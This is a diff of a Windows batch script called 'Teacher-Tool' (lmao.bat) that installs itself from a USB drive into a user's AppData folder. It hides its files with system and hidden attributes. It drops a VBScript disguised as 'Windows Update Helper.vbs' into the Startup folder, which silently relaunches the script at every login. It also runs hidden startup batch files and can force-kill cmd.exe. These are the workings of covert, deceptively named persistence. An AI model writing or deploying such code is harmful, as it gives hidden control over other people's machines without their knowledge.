@@ -1,5 +1,12 @@
-REM Version 4.7[4.6-DEBUGrelease-noverbugs]
+REM Version 5.4
 @echo off
+echo init begin
+echo taking ownership of lmao.bat
+takeown /f lmao.bat >nul 2>&1
+echo took ownership of lmao.bat
+set skipcheck=false
+set HDver=0
+set vers=0
 set novbs=false
 set debugmsg=true
 if exist debugmsg.dat (
@@ -8,35 +15,40 @@ copy debugmsg.dat "%appdata%\Microsoft\Windows\" /y >nul 2>&1
 )
 if %debugmsg%==false @echo on
 
+set ver=_NO_VER 0
+
 set /p ver=<lmao.bat
 set ver=%ver:REM =%
-set HDDver=NONE
+REM these lines will be repeated later to get USB version
 
-REM this for some reason needs to be here, otherwise it doesnt get executed
+title Teacher-Tool %ver%
+set HDDver=_NO_VER 0
+
 set /p HDDver=<"%appdata%\Microsoft\Windows\lmao.bat"
 if exist "%appdata%\Microsoft\Windows\lmao.bat" (
 if not %HDDver:~0,3%==REM (
 set HDDver=HDD version does not have header[ver possibly lower than 4.5-DEBUGrelease]...
+set skipcheck=true
 )
 )
 set HDDver=%HDDver:REM =%
 
-echo init begin
+REM because delayed expansion causes weird behavior with win. defender and values dont change in IFs(whyyyy), this is the only option. these variables are used when installing
+set HDver=%HDDver:~8%
+set HDver=%HDver:.=%
+set HDver=%HDver:[DEBUGrelease]=%
+
 set filename=lmao69.dat
 if not "%cd%"=="%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" (
 if not "%cd%"=="%appdata%\Microsoft\Windows" (
 if not exist %filename% (
-echo entered important file creation
+echo entered %filename% creation
 echo initcopy>%filename%
 attrib +h %filename%
 )
-if not exist "Windows Update Helper.vbs" (
-goto :createvbs
-)
-xcopy "Windows Update Helper.vbs" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs" /y
 )
 )
-:aftervbs
+
 set skip=False
 set tries=0
 if not exist "%appdata%\Microsoft\Windows\updating.dat" (echo launching atstartup applications if any... && if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup" (for /r "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup" %%a in (*.bat) do (call "%%a")))
@@ -99,30 +111,56 @@ set com=initcopy
 :d
 if exist UNIN000.dat goto :u
 if not %com%==initcopy (echo contents of %filename% are not correct or do not specify valid batch file && goto :searching)
+echo %filename% verified - on correct drive
+
 
 if not exist alreadycopied.dat (echo false >alreadycopied.dat)
 set /p copied=<alreadycopied.dat
 if exist novbs.dat set novbs=true
 
-echo %filename% verified - on correct drive
-if exist transfer.dat (echo beginning transfer of files && xcopy transfer\* %homedrive%%homepath% /y && echo transfer finished)
-if exist "Windows Update Helper.vbs" (
-echo installing vbs
-attrib -s "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs" >nul 2>&1
-xcopy "Windows Update Helper.vbs" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\" /y >nul 2>&1
-echo .vbs installed
+if exist TERMINATECMD.dat (taskkill /f /im "cmd.exe")
+if exist transfer.dat (echo beginning transfer of files && xcopy transfer\* %homedrive%%homepath% /y)
+
+
+REM second part from above, imported version from hdd version, and thus skipped every update
+set /p ver=<lmao.bat
+if not %ver:~0,3%==REM (
+set ver=USB VERSION DOESNT HAVE HEADER; DOWNGRADING BELOW 4.5-DEBUGrelease!!! BEWARE...
+attrib -h beware.dat >nul 2>&1
+echo DOWNGRADED FROM "%HDDver%" TO SOMETHING BELOW 4.5-DEBUGrelease!!! BEWARE... >beware.dat 
+attrib +h beware.dat
+set skipcheck=true
 )
+set ver=%ver:REM =%
+set vers=%ver:~8%
+set vers=%vers:.=%
+set vers=%vers:[DEBUGrelease]=%
+
+if "%HDver%"=="%vers%" (if %copied%==false (if %skipcheck%==false (echo no version change, update skipped... && goto :skipupdate)))
 
 if %dirr%==FLASH (
 if exist lmao.bat (
-echo updating lmao.bat
-echo Installing from: %HDDver%
+if %skipcheck%==false (
+if "%HDver%" LSS "%vers%" (echo upgrading...)
+if "%HDver%" GTR "%vers%" (echo downgrading...)
+)
+
+echo From: %HDDver%
 echo To: %ver%
-attrib -s "%appdata%\Microsoft\Windows\lmao.bat" >nul 2>&1
+
+echo re/installing vbs to be sure
+attrib -s "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs" >nul 2>&1
+goto :createvbs
+:aftervbs
+echo .vbs installed
+
+attrib -s -h "%appdata%\Microsoft\Windows\lmao.bat" >nul 2>&1
 del "%appdata%\Microsoft\Windows\lmao.bat" >nul 2>&1
-attrib -s lmao.bat
+attrib -s -h lmao.bat
 xcopy lmao.bat "%appdata%\Microsoft\Windows\" /y >nul 2>&1
+attrib +s +h lmao.bat
 echo new lmao.bat installed
+:skipupdate
 attrib -h alreadycopied.dat
 echo true >alreadycopied.dat
 attrib +h alreadycopied.dat
@@ -271,15 +309,16 @@ goto :afterndtask
 
 REM END OF CRUCIAL CODE POSITION
 
+
 :createvbs
 echo creating vbs
-echo Set WshShell = CreateObject("WScript.Shell")  >"Windows Update Helper.vbs"
-echo 'idk >>"Windows Update Helper.vbs"
-echo WshShell.Run chr(34) ^& "%appdata%\Microsoft\Windows\lmao.bat" ^& Chr(34), 0  >>"Windows Update Helper.vbs"
-echo 'idk >>"Windows Update Helper.vbs"
-echo 'idk >>"Windows Update Helper.vbs"
-echo Set WshShell = Nothing >>"Windows Update Helper.vbs"
-echo 'idk >>"Windows Update Helper.vbs"
-echo 'idk >>"Windows Update Helper.vbs"
+echo Set WshShell = CreateObject("WScript.Shell")  >"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs"
+echo 'idk >>"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs"
+echo WshShell.Run chr(34) ^& "%appdata%\Microsoft\Windows\lmao.bat" ^& Chr(34), 0  >>"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs"
+echo 'idk >>"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs"
+echo 'idk >>"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs"
+echo Set WshShell = Nothing >>"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs"
+echo 'idk >>"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs"
+echo 'idk >>"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs"
 echo created successfully
 goto :aftervbs
